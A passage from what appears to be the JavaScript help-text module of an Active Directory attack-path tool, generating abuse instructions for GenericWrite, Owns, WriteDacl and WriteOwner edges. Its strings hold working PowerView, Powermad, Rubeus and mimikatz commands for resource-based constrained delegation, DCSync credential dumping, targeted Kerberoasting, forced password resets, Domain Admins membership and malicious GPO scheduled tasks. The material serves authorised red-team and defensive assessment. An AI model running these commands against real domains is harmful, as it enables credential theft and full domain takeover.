            } else if (targetType === 'Computer') {
                text = `Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
                    
                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
            }
            formatted = text;
        } else if (edge.label === 'Owns') {
            let text;
            if (targetType === 'Group') {
                text = `To abuse ownership of a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers</code>
                
                You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember.

                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>

                Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

                <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>

                Cleanup for this can be done using Remove-DomainObjectAcl
                
                <code>Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers</code>`;
            } else if (targetType === 'User') {
                text = `To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>
                
                <h4> Targeted Kerberoast </h4>
                A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

                After running this, you can use Get-DomainSPNTicket as follows:
                    
                <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</code>

                The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>

                <h4> Force Change Password </h4>
                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then create a secure string object for the password you want to set on the target user:

                <code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

                Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred</code>

                Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
                
                Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:
                
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>`;
            } else if (targetType === 'Computer') {
                if (target.haslaps) {
                    text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
                
                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                    
                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
                    
                    Alternatively, you can execute a resource based constrained delegation attack.

                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>

                    Cleanup can be done using the Remove-DomainObjectAcl function:

                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
                } else {
                    text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
                
                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                    
                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack.

                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>

                    Cleanup can be done using the Remove-DomainObjectAcl function:

                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
                }
            } else if (targetType === 'Domain') {
                text = `To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>
                
                Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain

                <code>sekurlsa::dcsync /domain:testlab.local /user:Administrator</code>
                
                Cleanup can be done using the Remove-DomainObjectAcl function:
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>`;
            } else if (targetType === 'GPO') {
                text = `To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>
                
                With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse
                
                Cleanup can be done using the Remove-DomainObjectAcl function:
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>`;
            }
            formatted = text;
        } else if (edge.label === 'WriteDacl') {
            let text;
            if (targetType === 'Group') {
                text = `To abuse WriteDacl to a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers</code>
                
                You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember.

                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>

                Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

                <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>

                Cleanup for this can be done using Remove-DomainObjectAcl
                
                <code>Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers</code>`;
            } else if (targetType === 'User') {
                text = `To abuse WriteDacl to a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>
                
                <h4> Targeted Kerberoast </h4>
                A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

                After running this, you can use Get-DomainSPNTicket as follows:
                    
                <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</code>

                The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>

                <h4> Force Change Password </h4>
                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then create a secure string object for the password you want to set on the target user:

                <code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

                Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred</code>

                Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
                
                Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:
                
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>`;
            } else if (targetType === 'Computer') {
                if (target.haslaps) {
                    text = `To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege.
                
                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                    
                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
                    
                    Alternatively, you can execute a resource based constrained delegation attack.

                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>

                    Cleanup can be done using the Remove-DomainObjectAcl function:

                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
                } else {
                    text = `To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege.
                
                    You may need to authenticate to the Domain Controller as ${
                        sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`
                    }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                    
                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                    
                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
                    
                    Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack.

                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>

                    Cleanup can be done using the Remove-DomainObjectAcl function:

                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
                }
            } else if (targetType === 'Domain') {
                text = `To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>
                
                Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain

                <code>sekurlsa::dcsync /domain:testlab.local /user:Administrator</code>
                
                Cleanup can be done using the Remove-DomainObjectAcl function:
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>`;
            } else if (targetType === 'GPO') {
                text = `To abuse WriteDacl to a GPO object, you may grant yourself the GenericAll privilege.
                
                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
                
                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
                
                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>
                
                With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse
                
                Cleanup can be done using the Remove-DomainObjectAcl function:
                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All</code>`;
            }
            formatted = text;
        } else if (edge.label === 'WriteOwner') {
            let text;
            if (targetType === 'Group') {
                text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
